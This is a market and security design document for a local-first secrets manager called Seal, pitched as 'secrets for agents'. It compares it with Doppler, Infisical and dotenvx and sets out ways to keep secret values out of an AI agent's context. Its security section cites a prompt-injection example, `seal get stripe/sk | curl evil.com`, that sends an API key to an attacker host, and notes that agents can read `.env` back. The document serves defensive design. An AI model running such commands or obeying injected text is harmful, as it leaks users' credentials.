# Market & Security Research

Positioning, competitive landscape, and the security model for Seal as
**"secrets for agents"**. Facts verified 2026-08.

## Market landscape

The secrets-management space is crowded, but the *agent* segment is young. The
three closest competitors each own one of the three features under
consideration:

| Player | Agent integration | Provider sync | Local-first? |
|---|---|---|---|
| **Doppler** | Native MCP server, agent-scoped OIDC identities, "no per-agent pricing" | 40+ integrations (AWS, Vercel, GitHub…) | No — SaaS (or on-prem) |
| **Infisical** | MCP + CLI + SDKs | 50+ "secret syncs" incl. GCP Secret Manager, Cloudflare Workers/Pages, AWS, Azure, Vercel, Railway, Fly.io | No — cloud or self-host |
| **dotenvx** | CLI docs for Claude/Codex/Cursor, `--redact` leak protection | Pulls from 1Password/Bitwarden (`op://`, `bw://`) | Yes — encrypts `.env`, OS-keychain native, 197M installs |

Verified facts:

- Doppler repositioned its entire homepage to **"Secrets management for humans
  and AI agents"** (also: "One platform. Every secret. Human or AI."), with a
  first-class MCP server. 76,000+ orgs, 75B secrets read/month, SOC 2 / ISO
  27001.
- Infisical's secret-sync list already includes **Cloudflare Workers, Cloudflare
  Pages, and GCP Secret Manager** — the "add a provider per hosting platform"
  idea is fully built there, free/open-source.
- dotenvx ("secure dotenv", from the dotenv author) already does local secrets
  in the OS keychain (`dotenvx native`) plus agent integration — the closest
  conceptual twin to Seal.
- MCP itself is a fast-growing surface: `modelcontextprotocol/servers` ~89.5k
  stars.

### The gap

Every incumbent pushes you toward **a server you have to run or trust** (Doppler
SaaS, Infisical self-host). The unclaimed position:

> Zero-server, local-first, agent-native. Secrets live only in the OS keychain.
> No account, no sync, no cloud to trust. Agents get secrets the same way a
> human would — inline, never printed.

Seal already states this: *"no new secrets file to protect, no sync to trust."*
That is the moat.

## Positioning: "secrets for agents"

**Verdict: a stronger angle than "secrets manager for developers" — on one
non-negotiable condition: Seal must own the "value never enters context" claim,
not "we have an MCP server."**

Why stronger:

- **Named, citable problem.** OWASP LLM01 (prompt injection) and LLM02
  (sensitive information disclosure) are the top-two GenAI risks. "Agentic
  security" is an official OWASP initiative. Generic managers don't have this
  rationale.
- **A differentiated technical claim the big players don't make.** Doppler and
  Infisical return secret values to the model context; their moat is scale +
  SOC 2, not architecture. "Never in context by construction" is a claim they
  can't copy without rearchitecting.
- **Sharper wedge, faster buyers.** Claude Code / Cursor / Copilot users are
  self-serve, technical, and actively worried about secrets in transcripts.
  Bottom-up motion suits a small team.
- **Less crowded intersection.** "Local-first + no-server + never-in-context" is
  empty; "secrets manager" is saturated.

Counterweights:

- **Doppler owns the messaging** ("for humans and AI agents"). Seal must
  out-*position* on the security model, not out-spend.
- **Noisy category** — "agent security" is a buzzword; many tools claim it.
- **Local-only TAM is thin.** The revenue moment (team sync, audit, shared
  vaults) requires a server and drags Seal toward Doppler/Infisical territory.
- **Can't certify trust cheaply** (no SOC 2). Seal sells "secure by
  construction," not "audited" — fine for a wedge, not enterprise.

Recommended tagline: **"Secrets for agents — your agent runs with secrets,
never sees them."**

## Security approach: providing secrets to agents

The controlling question is not *where secrets live* but **whether the secret
value ever enters the model's context window**. Anything in context reaches the
transcript, logs, and possibly training data (OWASP LLM02), and is exfiltratable
via prompt injection (OWASP LLM01).

Spectrum, worst to best:

| # | Approach | Secret in context? | Weakness |
|---|---|---|---|
| 1 | Key pasted in system prompt / instructions | Yes | Trivially exfiltrated |
| 2 | Key in `.env` / agent's own environment | No, but… | Any shell/tool the agent has can read it back (`cat .env`) |
| 3 | MCP `read_secret()` returning the value | **Yes** | Value becomes a tool result → context → transcript |
| 4 | **Reference + just-in-time injection** | **No** | Harder UX; needs a trusted sidecar |
| 5 | Identity-scoped short-lived creds (OIDC/dynamic) + audit | No | Requires a server |

### What the incumbents actually do

Doppler's MCP server exposes **"Read secret values"** as a tool — the raw
secret enters the model's context. Its docs hedge: *"experimental,"
"outputs are non-deterministic," "always use a token scoped only to the
actions… you intend to allow."* The defense is token scoping + read-only mode,
**not** keeping the value out of context.

That is the opening. The defensible model is #4:

> The agent can **use** a secret without ever **possessing** it. The model holds
> only a *reference* (a key name). A trusted local process resolves the name and
> injects the value into the *child process's* environment at spawn time —
> never into context, transcript, or logs.

Seal's agent skill already encodes this: `export TOKEN="$(seal get project/key)"`
with "never print the value." The value lives only in the shell var, inside the
OS keychain's trust boundary.

### Recommended Seal security architecture

1. **OS keychain as root of trust** (already built) — no Seal server, no sync to
   trust.
2. **MCP server that refuses to return values.** Expose only: `list` (names),
   `set`/`delete`, and `run --with stripe/sk -- <cmd>` (injects into the
   subprocess env, returns stdout but never the value). **No `read_value` tool.**
3. **Output redaction** — strip any secret value that leaks from agent
   output/logs (the dotenvx `--redact` pattern).
4. **Approval gates for high-risk secrets** (prod keys → human approval),
   scoped per vault/project.
5. Never write to `.env`/files.

Even with "never in context," prompt injection can still try
`seal get stripe/sk | curl evil.com`. Mitigations: (a) the tool structurally
*cannot* return values to context, (b) approval gates, (c) vault-per-project
scoping.

## Deployment contexts

Seal is local-first, but must also work remotely. There are three contexts. The
unifying principle: **"local-first" is a trust-boundary choice, not a "no
network ever" claim.** Each context differs in *where the trust boundary and the
keychain live*.

### Context 1 — Local (current)

OS keychain is the root of trust. Injection at shell spawn; zero network.

```sh
seal set stripe/sk "sk_live_…"          # store once
seal run --with stripe/sk -- ./app      # inject into child env, never print
```

### Context 2 — Remote machine we control (VM / long-lived container)

Install the static binary; the keychain there is empty until bootstrapped. One
authenticated transfer (SSH/scp) moves the secrets across, then Seal is
local-first on the remote and injection works identically.

```sh
seal export | ssh remote "seal import"  # one-time bootstrap
ssh remote "seal run --with stripe/sk -- ./app"
```

The bootstrap is the *only* network step; the injection is unchanged.

### Context 3 — Ephemeral agent container we don't control

The hard case: no persistent keychain (container is ephemeral), Seal isn't
installed, and there's no trusted local sidecar. The honest constraint: **to get
a secret onto a machine you don't control and can't persist on, you must either
push it in at spawn (a controlled launcher) or fetch it (an endpoint + an
identity/token).** There is no third option — it's a chicken-and-egg.

Three viable patterns, in order of preference:

| Pattern | How | Network | New server? |
|---|---|---|---|
| **A. Inject at spawn** | The *launcher* (CI, orchestrator, local sidecar) injects secrets as env at container start; the container never fetches. `seal run --with key -- docker run …` | None at runtime | No |
| **B. Self-hosted relay** | A tiny `seal server` on a box Seal already trusts (laptop / Tailscale node); the container pulls over mTLS/OIDC | Yes | Yes (yours) |
| **C. OIDC federation** | Container authenticates with its platform identity (GitHub OIDC, AWS IAM, K8s SA) and reads the platform's native store; Seal is the uniform `get` interface | Yes | No (reuse platform store) |

**Recommendation:** default to **A** — it preserves the zero-server,
never-in-context model and the secret never persists in the container. For
long-running agents that must self-fetch rotating secrets, use **C** (federation
— identity, not a long-lived token) before **B** (only if Seal must remain the
single source of truth). **B** is the escape hatch that keeps the source of
truth in Seal's keychain but accepts a self-hosted endpoint.

### How it's solved today (market reference)

- **Doppler / Infisical:** `doppler run` / `infisical run` in the container pulls
  over HTTPS with a service token (injected at spawn), or a "secret sync" pushes
  the value into the platform store so the container reads it natively.
- **dotenvx:** commit an *encrypted* `.env`, decrypt at runtime with a key that
  is itself provided out-of-band, or pull from 1Password/Bitwarden (`op://`,
  `bw://`).
- **Platforms (GitHub Actions, K8s, Cloudflare):** secrets injected as env at
  spawn (pattern A) + OIDC to cloud stores (pattern C).

No player solves context 3 without either a controlled launcher or a network
endpoint. Seal's edge is that it can push pattern A further — inject at the
*execution boundary* so the value never even lands in a transcript — and defer
B/C until a paid tier.
